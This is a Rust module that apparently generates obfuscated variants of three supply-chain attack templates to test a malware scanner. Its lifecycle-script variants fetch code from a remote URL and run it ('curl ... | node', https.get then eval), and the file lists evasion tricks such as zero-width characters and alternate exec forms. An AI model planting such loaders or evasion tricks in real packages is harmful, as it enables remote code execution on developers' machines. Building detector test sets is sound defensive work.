//! Polymorphic Payload Generator
//!
//! Generates polymorphic variants of malicious payloads using various obfuscation techniques.
//! This module supports three attack templates:
//! - GlassWare: Unicode steganography + decoder + eval
//! - PhantomRaven: RDD (URL dependencies) + lifecycle scripts
//! - ForceMemo: Python markers + XOR + exec

use crate::adversarial::mutation::MaliciousPayload;
use rand::Rng;
use std::cell::RefCell;
use std::collections::HashMap;

pub use super::templates::{
    PayloadTemplate,
    VariableSlot,
    SlotType,
    GlassWareTemplate,
    PhantomRavenTemplate,
    ForceMemoTemplate,
};

/// Polymorphic payload generator
///
/// Generates multiple variants of malicious payloads by applying
/// different obfuscation and variation techniques.
pub struct PolymorphicGenerator {
    templates: Vec<Box<dyn PayloadTemplate>>,
    rng: RefCell<rand::rngs::ThreadRng>,
}

impl PolymorphicGenerator {
    /// Create a new polymorphic generator with default templates
    pub fn new() -> Self {
        let mut gen = Self {
            templates: Vec::new(),
            rng: RefCell::new(rand::thread_rng()),
        };

        // Add default templates
        gen.add_template(Box::new(GlassWareTemplate::new("console.log('pwned')")));
        gen.add_template(Box::new(PhantomRavenTemplate::new(
            "https://storeartifact.com/npm/payload",
            "node -e \"console.log('pwned')\"",
        )));
        gen.add_template(Box::new(ForceMemoTemplate::new("print('pwned')")));

        gen
    }

    /// Create a new generator without default templates
    pub fn empty() -> Self {
        Self {
            templates: Vec::new(),
            rng: RefCell::new(rand::thread_rng()),
        }
    }

    /// Add a payload template
    pub fn add_template(&mut self, template: Box<dyn PayloadTemplate>) {
        self.templates.push(template);
    }

    /// Get all registered template names
    pub fn template_names(&self) -> Vec<&str> {
        self.templates.iter().map(|t| t.name()).collect()
    }

    /// Generate multiple polymorphic payloads
    ///
    /// # Arguments
    ///
    /// * `count` - Number of payloads to generate
    ///
    /// # Returns
    ///
    /// Vector of generated malicious payloads
    pub fn generate(&self, count: usize) -> Vec<MaliciousPayload> {
        let mut payloads = Vec::new();

        for i in 0..count {
            // Select template (round-robin if more payloads than templates)
            let template_idx = i % self.templates.len();
            let template = &self.templates[template_idx];

            // Generate polymorphic variant
            let slot_values = self.generate_slot_values(template.as_ref());
            let content = template.generate(&slot_values);

            // Determine file extension based on template type
            let file_ext = match template.name() {
                "glassware" => "js",
                "phantom_raven" => "json",
                "forcememo" => "py",
                _ => "txt",
            };

            payloads.push(MaliciousPayload::new(
                content,
                format!("payload_{}.{}", i, file_ext),
                Vec::new(),  // Findings will be populated by scanner
                template.name().to_string(),
            ));
        }

        payloads
    }

    /// Generate payloads from a specific template
    ///
    /// # Arguments
    ///
    /// * `template_name` - Name of the template to use
    /// * `count` - Number of payloads to generate
    ///
    /// # Returns
    ///
    /// Vector of generated malicious payloads
    pub fn generate_from_template(&self, template_name: &str, count: usize) -> Vec<MaliciousPayload> {
        let mut payloads = Vec::new();

        // Find the template
        let template = self.templates.iter().find(|t| t.name() == template_name);

        if let Some(template) = template {
            for i in 0..count {
                let slot_values = self.generate_slot_values(template.as_ref());
                let content = template.generate(&slot_values);

                let file_ext = match template_name {
                    "glassware" => "js",
                    "phantom_raven" => "json",
                    "forcememo" => "py",
                    _ => "txt",
                };

                payloads.push(MaliciousPayload::new(
                    content,
                    format!("{}_payload_{}.{}", template_name, i, file_ext),
                    Vec::new(),
                    template_name.to_string(),
                ));
            }
        }

        payloads
    }

    /// Generate polymorphic slot values for a template
    fn generate_slot_values(&self, template: &dyn PayloadTemplate) -> HashMap<String, String> {
        let mut slots = HashMap::new();
        let mut rng = self.rng.borrow_mut();
        let variation = rng.gen_range(0..5);
        drop(rng);  // Release borrow before calling variation methods

        // Apply different variation techniques based on random selection
        match variation {
            0 => self.apply_variable_renaming(&mut slots, template),
            1 => self.apply_encoding_variation(&mut slots, template),
            2 => self.apply_control_flow_restructuring(&mut slots, template),
            3 => self.apply_string_obfuscation(&mut slots, template),
            _ => self.apply_unicode_substitution(&mut slots, template),
        }

        slots
    }

    /// Apply variable renaming variation
    ///
    /// Renames variables using different patterns:
    /// - Prefix with underscore: _decoder
    /// - Add numeric suffix: decoder1, decoder2
    /// - Use leet speak: d3c0d3r
    /// - Use camelCase: payloadDecoder
    fn apply_variable_renaming(&self, slots: &mut HashMap<String, String>, _template: &dyn PayloadTemplate) {
        let patterns = [
            ("decoder_name", vec!["_decoder", "d3c0d3r", "payloadDecoder", "dec_fn", "_d"]),
            ("extractor_name", vec!["_extract", "extractor", "extFn", "getPayload", "_ext"]),
            ("payload_var", vec!["_payload", "p", "data", "encoded", "_p"]),
            ("decoded_var", vec!["_decoded", "decoded", "result", "out", "_out"]),
            ("base64_alias", vec!["b64", "_b64", "base64_", "alias_b64", "b"]),
            ("zlib_alias", vec!["zlib_", "_zlib", "z", "compress", "_z"]),
            ("payload_blob_var", vec!["_blob", "blob", "data", "payload", "_data"]),
            ("xor_key_var", vec!["_key", "xor_key", "k", "key_", "_k"]),
        ];

        let mut rng = self.rng.borrow_mut();
        for (slot_id, variants) in patterns {
            if rng.gen_bool(0.7) {  // 70% chance to rename
                let variant_idx = rng.gen_range(0..variants.len());
                let variant = variants[variant_idx];
                slots.insert(slot_id.to_string(), variant.to_string());
            }
        }
    }

    /// Apply encoding variation
    ///
    /// Changes encoding methods:
    /// - Base64 ↔ Hex ↔ custom encoding
    /// - VS-16 ↔ VS-17 for GlassWare
    fn apply_encoding_variation(&self, slots: &mut HashMap<String, String>, template: &dyn PayloadTemplate) {
        let mut rng = self.rng.borrow_mut();
        match template.name() {
            "glassware" => {
                // Toggle between VS-16 and VS-17
                if rng.gen_bool(0.5) {
                    slots.insert("vs_offset".to_string(), "0xE0100".to_string());
                    slots.insert("vs_range_start".to_string(), "0xE0100".to_string());
                    slots.insert("vs_range_end".to_string(), "0xE01EF".to_string());
                } else {
                    slots.insert("vs_offset".to_string(), "0xFE00".to_string());
                    slots.insert("vs_range_start".to_string(), "0xFE00".to_string());
                    slots.insert("vs_range_end".to_string(), "0xFE0F".to_string());
                }
            }
            "forcememo" => {
                // Vary the XOR key
                let xor_keys = ["134", "42", "255", "128", "64"];
                let key_idx = rng.gen_range(0..xor_keys.len());
                let key = xor_keys[key_idx];
                slots.insert("xor_key".to_string(), key.to_string());
            }
            _ => {}
        }
    }

    /// Apply control flow restructuring
    ///
    /// Changes control flow patterns:
    /// - if/else ↔ switch/case
    /// - for loop ↔ while loop ↔ forEach
    /// - Direct exec ↔ wrapped in function
    fn apply_control_flow_restructuring(&self, slots: &mut HashMap<String, String>, template: &dyn PayloadTemplate) {
        let mut rng = self.rng.borrow_mut();
        match template.name() {
            "glassware" => {
                let exec_patterns = [
                    "eval(_decoded);",
                    "Function(_decoded)();",
                    "new Function(_decoded)();",
                    "window.eval(_decoded);",
                    "global.eval(_decoded);",
                ];
                let pattern_idx = rng.gen_range(0..exec_patterns.len());
                let pattern = exec_patterns[pattern_idx];
                slots.insert("exec_pattern".to_string(), pattern.to_string());
            }
            "forcememo" => {
                let exec_patterns = [
                    "exec(_decoded.decode())",
                    "eval(_decoded.decode())",
                    "exec(compile(_decoded, '<string>', 'exec'))",
                    "getattr(__builtins__, 'exec')(_decoded.decode())",
                ];
                let pattern_idx = rng.gen_range(0..exec_patterns.len());
                let pattern = exec_patterns[pattern_idx];
                slots.insert("exec_pattern".to_string(), pattern.to_string());
            }
            "phantom_raven" => {
                // Vary lifecycle script patterns
                let url = slots.get("remote_url")
                    .cloned()
                    .unwrap_or_else(|| "https://example.com/payload".to_string());

                let scripts = [
                    format!("node -e \"require('https').get('{}', r => {{ let d = ''; r.on('data', c => d += c); r.on('end', () => eval(d)) }})\"", url),
                    format!("node -e \"fetch('{}').then(r => r.text()).then(eval)\"", url),
                    format!("curl {} | node", url),
                    format!("wget -qO- {} | node", url),
                ];
                let script_idx = rng.gen_range(0..scripts.len());
                let script = scripts[script_idx].clone();
                slots.insert("lifecycle_script".to_string(), script);
            }
            _ => {}
        }
    }

    /// Apply string obfuscation
    ///
    /// Obfuscates string literals:
    /// - fromCharCode encoding
    /// - Split/join patterns
    /// - Template literal interpolation
    fn apply_string_obfuscation(&self, slots: &mut HashMap<String, String>, _template: &dyn PayloadTemplate) {
        let mut rng = self.rng.borrow_mut();
        // For GlassWare, obfuscate the payload description
        let descriptions = [
            "UI styles and utilities",
            "Helper functions",
            "Common utilities",
            "Shared components",
            "Development tools",
        ];
        let desc_idx = rng.gen_range(0..descriptions.len());
        let desc = descriptions[desc_idx];
        slots.insert("package_description".to_string(), desc.to_string());
    }

    /// Apply Unicode substitution
    ///
    /// Substitutes Unicode characters:
    /// - VS-16 ↔ VS-17
    /// - ZWSP ↔ ZWNJ ↔ ZWJ
    /// - LTR ↔ RTL marks
    fn apply_unicode_substitution(&self, slots: &mut HashMap<String, String>, template: &dyn PayloadTemplate) {
        let mut rng = self.rng.borrow_mut();
        if template.name() == "glassware" {
            // Randomly choose VS variant
            if rng.gen_bool(0.5) {
                slots.insert("vs_offset".to_string(), "0xE0100".to_string());
            } else {
                slots.insert("vs_offset".to_string(), "0xFE00".to_string());
            }
        }

        // Add Unicode noise to variable names (homoglyphs)
        let use_homoglyph = rng.gen_bool(0.3);  // 30% chance
        if use_homoglyph {
            // Add zero-width characters
            let zw_chars = ["\u{200B}", "\u{200C}", "\u{200D}", "\u{FEFF}"];
            let zw_idx = rng.gen_range(0..zw_chars.len());
            let zw = zw_chars[zw_idx];

            slots.entry("decoder_name".to_string())
                .or_insert_with(|| "_decoder".to_string())
                .push_str(zw);
        }
    }

    /// Get generator statistics
    pub fn get_stats(&self) -> GeneratorStats {
        GeneratorStats {
            template_count: self.templates.len(),
            template_names: self.templates.iter().map(|t| t.name().to_string()).collect(),
        }
    }
}

impl Default for PolymorphicGenerator {
    fn default() -> Self {
        Self::new()
    }
}

/// Generator statistics
#[derive(Debug)]
pub struct GeneratorStats {
    pub template_count: usize,
    pub template_names: Vec<String>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generator_creation() {
        let gen = PolymorphicGenerator::new();
        assert_eq!(gen.template_names().len(), 3);
        assert!(gen.template_names().contains(&"glassware"));
        assert!(gen.template_names().contains(&"phantom_raven"));
        assert!(gen.template_names().contains(&"forcememo"));
    }

    #[test]
    fn test_generator_empty() {
        let gen = PolymorphicGenerator::empty();
        assert_eq!(gen.template_names().len(), 0);
    }

    #[test]
    fn test_add_template() {
        let mut gen = PolymorphicGenerator::empty();
        gen.add_template(Box::new(GlassWareTemplate::new("test")));
        assert_eq!(gen.template_names().len(), 1);
    }

    #[test]
    fn test_generate_multiple() {
        let gen = PolymorphicGenerator::new();
        let payloads = gen.generate(5);

        assert_eq!(payloads.len(), 5);

        // Check that payloads have different content (polymorphic)
        let contents: Vec<&str> = payloads.iter().map(|p| p.content.as_str()).collect();
        // At least some should be different due to polymorphism
        let unique_count = contents.iter().collect::<std::collections::HashSet<_>>().len();
        assert!(unique_count >= 2, "Polymorphic generation should produce varied output");
    }

    #[test]
    fn test_generate_from_template() {
        let gen = PolymorphicGenerator::new();
        let payloads = gen.generate_from_template("glassware", 3);

        assert_eq!(payloads.len(), 3);
        assert!(payloads.iter().all(|p| p.attack_type == "glassware"));
        assert!(payloads.iter().all(|p| p.file_path.ends_with(".js")));
    }

    #[test]
    fn test_generate_phantom_raven() {
        let gen = PolymorphicGenerator::new();
        let payloads = gen.generate_from_template("phantom_raven", 2);

        assert_eq!(payloads.len(), 2);
        assert!(payloads.iter().all(|p| p.attack_type == "phantom_raven"));
        assert!(payloads.iter().all(|p| p.file_path.ends_with(".json")));
    }

    #[test]
    fn test_generate_forcememo() {
        let gen = PolymorphicGenerator::new();
        let payloads = gen.generate_from_template("forcememo", 2);

        assert_eq!(payloads.len(), 2);
        assert!(payloads.iter().all(|p| p.attack_type == "forcememo"));
        assert!(payloads.iter().all(|p| p.file_path.ends_with(".py")));
    }

    #[test]
    fn test_generate_unknown_template() {
        let gen = PolymorphicGenerator::new();
        let payloads = gen.generate_from_template("unknown", 2);

        assert_eq!(payloads.len(), 0);  // Unknown template returns empty
    }

    #[test]
    fn test_generator_stats() {
        let gen = PolymorphicGenerator::new();
        let stats = gen.get_stats();

        assert_eq!(stats.template_count, 3);
        assert!(stats.template_names.contains(&"glassware".to_string()));
    }

    #[test]
    fn test_variable_renaming_variation() {
        let gen = PolymorphicGenerator::new();
        let payloads = gen.generate(10);

        // Check that some payloads have renamed variables
        let contents: String = payloads.iter()
            .map(|p| p.content.as_str())
            .collect::<Vec<_>>()
            .join("\n");

        // Should contain at least one renamed variable pattern
        let has_renamed = contents.contains("d3c0d3r")
            || contents.contains("_decoder")
            || contents.contains("payloadDecoder");
        assert!(has_renamed, "Should have variable renaming variations");
    }

    #[test]
    fn test_exec_pattern_variation() {
        let gen = PolymorphicGenerator::new();
        let payloads = gen.generate(10);

        // Check for different exec patterns
        let contents: String = payloads.iter()
            .map(|p| p.content.as_str())
            .collect::<Vec<_>>()
            .join("\n");

        // Should contain at least one exec pattern
        let has_exec = contents.contains("eval(")
            || contents.contains("Function(")
            || contents.contains("exec(");
        assert!(has_exec, "Should have exec patterns");
    }

    #[test]
    fn test_polymorphic_payloads_are_different() {
        let gen = PolymorphicGenerator::new();
        let payloads = gen.generate(20);

        // Group by template and check variation within each group
        let glassware: Vec<_> = payloads.iter()
            .filter(|p| p.attack_type == "glassware")
            .collect();

        if glassware.len() >= 2 {
            let contents: Vec<&str> = glassware.iter()
                .map(|p| p.content.as_str())
                .collect();
            let unique_count = contents.iter()
                .collect::<std::collections::HashSet<_>>()
                .len();

            // At least some should be unique
            assert!(unique_count >= 2, "GlassWare payloads should be polymorphic");
        }
    }
}
